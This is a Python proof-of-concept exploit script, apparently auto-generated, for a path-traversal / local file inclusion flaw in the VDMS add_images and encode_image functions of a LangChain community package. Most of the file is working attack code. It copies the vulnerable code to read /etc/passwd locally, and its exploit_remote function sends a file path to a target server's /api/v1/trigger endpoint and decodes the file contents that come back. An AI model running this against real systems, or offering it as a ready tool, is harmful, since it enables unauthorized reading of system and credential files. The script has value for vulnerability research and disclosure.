#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-005
# Sink: encode_image
# Auto-generated — run with: python3 lfi_supply_like_encode_image_3.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in langchain-community-only.

Vulnerability: The `add_images` function in VDMS vectorstore passes user-controlled
`uris` directly to `encode_image`, which opens the file path without validation.
An attacker can supply a path like '../../etc/passwd' to read arbitrary files.

Usage:
    python3 poc.py [--target http://localhost:8000] [--file /etc/passwd]
"""

import argparse
import base64
import os
import sys
import tempfile
import uuid

# Simulate the vulnerable library code (as found in the source)
# This replicates the exact vulnerable functions from langchain-community-only

def encode_image(image_path: str) -> str:
    """Vulnerable sink: opens file without validation."""
    with open(image_path, "rb") as f:
        blob = f.read()
        return base64.b64encode(blob).decode("utf-8")

class VDMS:
    """Simulated VDMS class with the vulnerable add_images method."""
    
    def __init__(self):
        self.embeddings = []
    
    def _embed_image(self, uris):
        """Stub: returns dummy embeddings."""
        return [f"embedding_{i}" for i in range(len(uris))]
    
    def __from(self, texts, embeddings, ids, metadatas, batch_size, **kwargs):
        """Stub: just stores the data."""
        self.embeddings = list(zip(ids, texts, metadatas))
    
    def add_images(self, uris, metadatas=None, ids=None, batch_size=10, add_path=False, **kwargs):
        """
        Vulnerable entry point: passes uris directly to encode_image.
        This is the exact code from the library.
        """
        # Map from uris to blobs to base64
        b64_texts = [self.encode_image(image_path=uri) for uri in uris]
        
        if add_path and metadatas:
            for midx, uri in enumerate(uris):
                metadatas[midx]["image_path"] = uri
        elif add_path:
            metadatas = []
            for uri in uris:
                metadatas.append({"image_path": uri})
        
        # Populate IDs
        ids = ids if ids is not None else [str(uuid.uuid4()) for _ in uris]
        
        # Set embeddings
        embeddings = self._embed_image(uris=uris)
        
        if metadatas is None:
            metadatas = [{} for _ in uris]
        else:
            metadatas = [m for m in metadatas]  # simplified validation
        
        self.__from(
            texts=b64_texts,
            embeddings=embeddings,
            ids=ids,
            metadatas=metadatas,
            batch_size=batch_size,
            **kwargs,
        )
        return ids
    
    # Alias to match the library's method name
    encode_image = encode_image


def test_benign_payload():
    """Test with a benign payload to confirm the vulnerability works."""
    print("[*] Testing with benign payload...")
    
    # Create a temporary file to read
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
        f.write("POC_SUCCESS: This file was read via LFI vulnerability")
        benign_path = f.name
    
    try:
        vdms = VDMS()
        result = vdms.add_images(uris=[benign_path])
        print(f"[+] Successfully read benign file via LFI")
        print(f"[+] Result IDs: {result}")
        
        # Verify the content was base64 encoded
        b64_content = vdms.embeddings[0][1]
        decoded = base64.b64decode(b64_content).decode('utf-8')
        print(f"[+] Decoded content: {decoded}")
        assert "POC_SUCCESS" in decoded, "Failed to read file content"
        print("[+] Vulnerability confirmed: arbitrary file read works!")
        
    except Exception as e:
        print(f"[-] Error during benign test: {e}")
        sys.exit(1)
    finally:
        os.unlink(benign_path)


def exploit_remote(target_url, file_path):
    """
    Attempt to exploit the vulnerability against a remote endpoint.
    This simulates the web endpoint described in the finding:
    @app.post("/api/v1/trigger")
    def handle_request(untrusted_user_input: str):
        result = add_images(untrusted_user_input)
    """
    import requests
    
    print(f"[*] Attempting remote exploit against {target_url}")
    print(f"[*] Target file: {file_path}")
    
    # The payload is the file path to read
    payload = file_path
    
    try:
        # Simulate the API call - adjust based on actual endpoint
        response = requests.post(
            f"{target_url}/api/v1/trigger",
            json={"uris": [payload]},
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            print(f"[+] Server responded with: {data}")
            
            # Try to decode any base64 content
            if isinstance(data, dict) and "result" in data:
                try:
                    decoded = base64.b64decode(data["result"]).decode('utf-8', errors='replace')
                    print(f"[+] Decoded file content:\n{decoded}")
                except:
                    print(f"[+] Raw response: {data}")
        else:
            print(f"[-] Server returned status {response.status_code}")
            print(f"[-] Response: {response.text}")
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Could not connect to {target_url}")
        print("[-] Make sure the target server is running")
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
    except Exception as e:
        print(f"[-] Error: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI in langchain-community-only VDMS add_images"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8000",
        help="Target URL (default: http://localhost:8000)"
    )
    parser.add_argument(
        "--file",
        default="/etc/passwd",
        help="File to read (default: /etc/passwd)"
    )
    parser.add_argument(
        "--remote",
        action="store_true",
        help="Attempt remote exploit instead of local test"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("LFI Proof-of-Concept for langchain-community-only")
    print("=" * 60)
    
    if args.remote:
        exploit_remote(args.target, args.file)
    else:
        # First run the benign local test
        test_benign_payload()
        
        print("\n[*] Now attempting to read a sensitive file locally...")
        vdms = VDMS()
        try:
            result = vdms.add_images(uris=[args.file])
            b64_content = vdms.embeddings[0][1]
            decoded = base64.b64decode(b64_content).decode('utf-8', errors='replace')
            print(f"[+] Successfully read {args.file}")
            print(f"[+] Content:\n{decoded}")
        except FileNotFoundError:
            print(f"[-] File {args.file} not found (expected on non-Linux systems)")
        except PermissionError:
            print(f"[-] Permission denied reading {args.file}")
        except Exception as e:
            print(f"[-] Error: {e}")


if __name__ == "__main__":
    main()
